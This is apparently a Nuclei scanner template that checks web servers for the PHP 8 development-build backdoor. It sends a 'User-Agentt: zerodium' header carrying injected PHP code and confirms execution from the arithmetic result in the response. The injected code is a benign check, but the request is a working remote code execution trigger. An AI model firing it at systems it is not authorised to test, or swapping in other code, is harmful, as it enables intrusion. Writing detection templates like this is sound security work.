id: PHP8-dev-RCE
info:
  author: shifacyclewala & hackergautam
  name: PHP8-dev-RCE
  severity: critical
  tags: rce,php
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - int(1787569)
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 43

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    User-Agentt: zerodiumvar_dump(1337*1337);

    '
